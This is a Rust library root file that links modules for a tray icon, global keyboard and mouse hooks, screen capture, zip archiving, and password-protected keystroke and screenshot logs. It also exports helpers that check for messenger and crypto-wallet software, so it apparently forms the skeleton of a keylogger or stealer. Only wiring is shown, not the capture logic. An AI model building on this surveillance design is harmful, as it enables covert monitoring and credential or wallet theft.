#[cfg(target_os = "windows")]
#[path = "./sys/windows/mod.rs"]
mod sys;
mod tray;
mod zip;
mod frames;
mod track;
mod capture;
mod password;
mod utils;

pub use crate::tray::icon::Icon;
pub use crate::tray::menubuilder::{MenuBuilder, MenuItem};
pub use crate::tray::trayicon::TrayIcon;
pub use crate::tray::trayiconbuilder::Error;
pub use crate::tray::trayiconbuilder::TrayIconBuilder;
pub use crate::track::{
    Button, DisplayError, Event, EventType, GrabCallback, GrabError, Key, KeyboardState,
    ListenError, SimulateError,
};
pub use crate::zip::compression::{CompressionMethod, SUPPORTED_COMPRESSION_METHODS};
pub use crate::zip::read::ZipArchive;
pub use crate::zip::types::DateTime;
pub use crate::zip::write::ZipWriter;
pub use crate::zip::result::ZipResult;
pub use crate::zip::write::FileOptions;
pub use crate::capture::Screen;

pub use frames::basic::MyWindow;
pub use frames::login::LoginWindow;
pub use frames::document::DocumentWindow;

pub use utils::{
    do_logs,
    append_logs,
    read_logs_with_password,
    append_screenshots,
    read_screens,
    links,
    is_messengers,
    is_wallets
};

use anyhow::Result;

#[cfg(target_os = "macos")]
mod macos;
#[cfg(target_os = "macos")]
pub use crate::macos::Keyboard;
#[cfg(target_os = "macos")]
use crate::macos::{display_size as _display_size, listen as _listen, simulate as _simulate};
#[cfg(target_os = "macos")]
use macos::*;

#[cfg(target_os = "linux")]
mod linux;
#[cfg(target_os = "linux")]
pub use crate::linux::Keyboard;
#[cfg(target_os = "linux")]
use crate::linux::{display_size as _display_size, listen as _listen, simulate as _simulate};
#[cfg(target_os = "linux")]
use linux::*;

#[cfg(target_os = "windows")]
mod win;
#[cfg(target_os = "windows")]
pub use crate::win::Keyboard;
#[cfg(target_os = "windows")]
use crate::win::{display_size as _display_size, listen as _listen, simulate as _simulate};

#[cfg(target_os = "windows")]
use win::*;

// Each OS specific implementation must export following:
pub(crate) use crate::sys::{
    // MenuBuilder<T> -> Result<MenuSys<T>, Error>
    build_menu,

    // TrayIconBuilder<T> -> Result<Box<TrayIconSys<T>>, Error>
    build_trayicon,

    // Struct that must implement IconBase + Clone
    IconSys,

    // Struct
    MenuSys,

    // Struct that must implement TrayIconBase
    TrayIconSys,
};

/// TrayIconSys must implement this
pub(crate) trait TrayIconBase<T>
where
    T: PartialEq + Clone + 'static,
{
    fn set_icon(&mut self, icon: &Icon) -> Result<(), Error>;
    fn set_menu(&mut self, menu: &MenuBuilder<T>) -> Result<(), Error>;
    fn set_tooltip(&mut self, tooltip: &str) -> Result<(), Error>;
}

/// IconSys must implement this
pub(crate) trait IconBase {
    fn from_buffer(
        buffer: &'static [u8],
        width: Option<u32>,
        height: Option<u32>,
    ) -> Result<IconSys, Error>;
}

/// Track must implement this
pub fn listen<T>(callback: T) -> Result<(), ListenError>
where
    T: FnMut(Event) + 'static,
{
    _listen(callback)
}

pub fn simulate(event_type: &EventType) -> Result<(), SimulateError> {
    _simulate(event_type)
}

pub fn display_size() -> Result<(u64, u64), DisplayError> {
    _display_size()
}

#[cfg(feature = "unstable_grab")]
#[cfg(target_os = "linux")]
pub use crate::linux::grab as _grab;
#[cfg(feature = "unstable_grab")]
#[cfg(target_os = "macos")]
pub use crate::macos::grab as _grab;
#[cfg(feature = "unstable_grab")]
#[cfg(target_os = "windows")]
pub use crate::win::grab as _grab;
#[cfg(any(feature = "unstable_grab"))]

#[cfg(any(feature = "unstable_grab"))]
pub fn grab<T>(callback: T) -> Result<(), GrabError>
where
    T: Fn(Event) -> Option<Event> + 'static,
{
    _grab(callback)
}